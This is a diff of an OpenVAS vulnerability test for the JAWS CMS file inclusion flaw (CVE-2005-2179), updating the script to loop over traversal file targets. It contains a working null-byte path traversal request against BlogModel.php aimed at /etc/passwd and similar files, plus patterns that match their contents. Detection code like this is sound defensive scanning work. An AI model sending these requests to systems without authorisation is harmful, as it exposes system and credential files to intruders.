@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: jaws_file_inclusion.nasl 6053 2017-05-01 09:02:51Z teissa $
+# $Id: jaws_file_inclusion.nasl 11761 2018-10-05 10:25:32Z jschulte $
 #
 # File Inclusion Vulnerability in Jaws
 #
@@ -32,8 +32,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.19395");
-  script_version("$Revision: 6053 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
+  script_version("$Revision: 11761 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 12:25:32 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_cve_id("CVE-2005-2179");
   script_bugtraq_id(14158);
@@ -43,22 +43,18 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
   script_family("Web application abuses");
-  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
   script_xref(name:"URL", value:"http://www.hardened-php.net/advisory-072005.php");
 
-  tag_summary = "The remote host is running JAWS, a content management system written
+  script_tag(name:"solution", value:"Upgrade to JAWS version 0.5.3 or later.");
+  script_tag(name:"summary", value:"The remote host is running JAWS, a content management system written
   in PHP.
 
   The remote version of Jaws allows an attacker to include URLs
-  remotely.";
-
-  tag_solution = "Upgrade to JAWS version 0.5.3 or later.";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  remotely.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -68,24 +64,33 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
 
+files = traversal_files();
+
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string( dir, "/gadgets/Blog/BlogModel.php?path=/etc/passwd%00" );
 
-  req = http_get( item:url, port:port );
-  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+  foreach pattern( keys( files ) ) {
 
-  if( egrep( string:res, pattern:".*root:.*:0:[01]:.*" ) || # we could read /etc/passwd.
-      egrep( string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream" ) || # we got an error suggesting magic_quotes_gpc was enabled but
-      egrep( string:res, pattern:"Warning: .+ Failed opening '/etc/passwd.+for inclusion" ) ) { # remote URLs might still work.
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
+    file = files[pattern];
+
+    url = string( dir, "/gadgets/Blog/BlogModel.php?path=/" + file + "%00" );
+
+    req = http_get( item:url, port:port );
+    res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+
+    if( egrep( string:res, pattern:pattern ) ||
+        egrep( string:res, pattern:"Warning: main\(/" + file + ".+failed to open stream" ) || # we got an error suggesting magic_quotes_gpc was enabled but
+        egrep( string:res, pattern:"Warning: .+ Failed opening '/" + file + ".+for inclusion" ) ) { # remote URLs might still work.
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
